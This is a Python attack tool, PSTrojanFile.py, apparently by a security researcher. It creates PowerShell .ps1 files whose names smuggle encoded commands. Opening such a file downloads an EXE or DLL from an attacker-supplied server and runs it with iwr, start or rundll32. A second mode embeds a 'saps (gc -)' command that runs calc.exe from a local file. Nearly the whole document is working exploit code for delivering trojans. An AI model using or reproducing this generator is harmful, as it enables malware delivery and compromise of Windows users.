from base64 import b64encode
import argparse,sys,os
#PSTrojanFile.py
#By hyp3rlinx (c) 2023
#ApparitionSec
#hyp3rlinx.altervista.org
#twitter.com/hyp3rlinx
#twitter.com/malvuln
#============================================================================================
#Create vulnerable Windows .PS1 (PowerShell) files with specially crafted exploitable names.
#Example:
#Test;POweRsHeLL -e [BASE64 PAYLOAD];.ps1
#Testing;saps (gc -)PoC;.ps1
#
#Updated for Python3 from my orginal 2019 script with added DLL support and fixes.
#Creates malicious ".ps1" PowerShell files with embedded trojan filename commands.
#Download, save and execute malware (EXE,DLL) all from within a PowerShell Filename.
#Expects hostname/ip-address of web-server housing an executable.
#
#Vectors:
#Double-click, drag and drop to a PowerShell shortcut, command line.
#
#Requirements:
#=============
#1) .PS1 files set to open and run with PowerShell as the default program 
#2) Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
#
#By hyp3rlinx - apparitionSec
#===========================================================================================
BANNER="""
   _ \    ___| __ __|           _)                ____| _)  |       
  |   | \___ \    |   __|  _ \   |   _` |  __ \   |      |  |   _ \ 
  ___/        |   |  |    (   |  |  (   |  |   |  __|    |  |   __/ 
 _|     _____/   _| _|   \___/   | \__,_| _|  _| _|     _| _| \___| 
                             ___/
                                                      By hyp3rlinx
                                                    (C) circa 2023
"""

#Console colors
RED="\033[1;31;40m"
GREY="\033[1;30;40m"
CYAN="\033[1;36;40m"
YELLOW="\033[1;33;40m"
ENDC = '\033[m' #Default

def parse_args():
    parser.add_argument("-i", "--ipaddress", help="Remote server hosting a Malware.")
    parser.add_argument("-m", "--local_malware_name", help="Name of the Malware on disk after download.")
    parser.add_argument("-r", "--remote_malware_name", help="Malwares name on remote server.")
    parser.add_argument("-t", "--type", help="Executable type EXE or DLL (required)")
    parser.add_argument("-f", "--from_file", nargs="?", const="1", help="Execute commands from a local text-file named '-' (dash).")
    parser.add_argument("-u", "--usage", nargs="?", const="1", help="Usage examples.")
    return parser.parse_args()

def show_usage():
    print(RED+BANNER+ENDC)
    print(CYAN+"[+] "+GREY+"PSTrojanFile.py -i 127.0.0.1 -m hate.exe -r 1.exe  -t exe")
    print(CYAN+"[+] "+GREY+"PSTrojanFile.py -i x.x.x.x -m q.z -r s.dll -t dll"+ENDC)
    

def main(args):
    PSEmbedFilenameMalwr=""
    if args.usage:
        show_usage()
        return
    if args.from_file: #Create PS1 file that executes code from a text-file using saps gc (get-content).
        if create_file("",1):
            success(1)
    if args.ipaddress:
        if not args.type:
            show_usage()
            print(YELLOW+"[!] "+GREY+"Provide the executable type DLL or EXE"+ENDC)
            exit(1)
        if args.type=="exe": #EXE saved to current dir where the vuln PS script is run.
            PSEmbedFilenameMalwr = "iwr "+args.ipaddress+"/"+args.remote_malware_name+" -O "+args.local_malware_name+";sleep -s 2;start "+args.local_malware_name
        else: #DLL saved to users downloads directory.
            PSEmbedFilenameMalwr = "saps "+"http://"+args.ipaddress+"/"+args.remote_malware_name+";sleep -s2;rundll32 $HOME/Downloads/"+args.local_malware_name+", 0"
    return b64encode(PSEmbedFilenameMalwr.encode('UTF-16LE')).decode()

def success(obj):
    print(RED+BANNER+ENDC)
    print(GREY+"[+] PS1 Trojan File Created!")
    if obj==1:
        print(GREY+"[+] Added 'calc.exe' command to created file named '-' (dash)"+ENDC)

def create_file(payload, local):
    if local==1:
        f=open("Testing;saps (gc -)PoC;.ps1", "w")
        f2=open("-", "w")
        f2.write("calc.exe")
        f2.close()
    else:
        f=open("Test;PoWeRShell -e "+payload+";2.ps1", "w")
    f.write("Write-Output 'Have a nice day GG!'")
    f.close()
    return True

if __name__=="__main__":
    os.system("color")
    parser = argparse.ArgumentParser()
    PSCmds = main(parse_args())

    if len(sys.argv)==1:
        print(RED+BANNER+GREY)
        parser.print_help(sys.stderr)
        print(ENDC)
        sys.exit(1)
    if PSCmds:
        if create_file(PSCmds,0):
            success(0)

    
